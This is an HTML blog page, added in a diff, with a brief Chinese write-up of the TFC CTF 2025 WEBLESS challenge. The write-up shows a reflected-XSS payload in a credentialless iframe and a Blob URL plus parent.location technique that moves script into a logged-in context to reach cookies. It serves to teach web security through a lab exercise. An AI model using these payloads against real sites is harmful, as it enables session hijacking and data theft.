@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>TFC CTF 2025 WEBLESS · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">TFC CTF 2025 WEBLESS</h1>
+    <p class="post-meta">
+      <time datetime="2025-08-31T20:04:22.000Z" itemprop="datePublished">2025-08-31</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="TFC-CTF-2025-WEBLESS"><a href="#TFC-CTF-2025-WEBLESS" class="headerlink" title="TFC CTF 2025 WEBLESS"></a>TFC CTF 2025 WEBLESS</h2><p>一个XSS ctf，简单概括下题目要点：</p>
+<ul>
+<li>未登录下，在登录页面，有GET类型的反射型xss，</li>
+<li>登录状态，在笔记页面，可以写入内容，但是有csp <code>&quot;script-src &#39;none&#39;; style-src &#39;self&#39;&quot;</code></li>
+</ul>
+<p>解法如下：</p>
+<p>在笔记页面，使用iframe加上credentialless，构造</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">iframe</span> src=<span class="string">"http://127.0.0.1:5000/login?username='&gt;&lt;img/src=x onerror=alert(1)&gt;&amp;password=yes"</span> <span class="attribute">width</span>=<span class="string">"960"</span> height=<span class="string">"600"</span> credentialless&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样打开笔记页面时，iframe就可以执行js代码。</p>
+<p>实际利用的payload，使用blob，然后parent.location跳转到这个blob。</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const c = URL.createObjectURL(</span><br><span class="line">      new Blob(</span><br><span class="line">        [</span><br><span class="line">          <span class="string">"&lt;script&gt;alert(document.domain)&lt;/script&gt;"</span> </span><br><span class="line">        ],</span><br><span class="line">        &#123; <span class="keyword">type</span>: <span class="string">"text/html"</span> &#125;</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">parent.<span class="keyword">location</span> <span class="title">= c</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>URL.createObjectURL() 创建一个 Blob URL 时，这个新的 blob: URL 会继承创建它的那个页面的源（Origin）。</p>
+</blockquote>
+<blockquote>
+<p>Blob 本身只是内存中的一块数据。我们利用它来做“上下文切换”，把攻击载荷从受限的环境转移到我们想要的环境。在我们的攻击中：iframe是一个未登录的、受限的上下文。XSS 脚本在 iframe 中执行的唯一命令是 parent.location = …。<br>这个命令强制父窗口（也就是帖子的主页面，它是一个已登录的上下文）去加载我们刚刚创建的 Blob URL。<br>这样一来，我们最终的偷旗脚本 (finalPayload) 就成功地从 iframe 的“未登录”上下文，被转移到了主窗口的“已登录”上下文中去执行了。</p>
+</blockquote>
+<p>在blob中执行的代码可以使用原主页面的cookie。</p>
+</div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
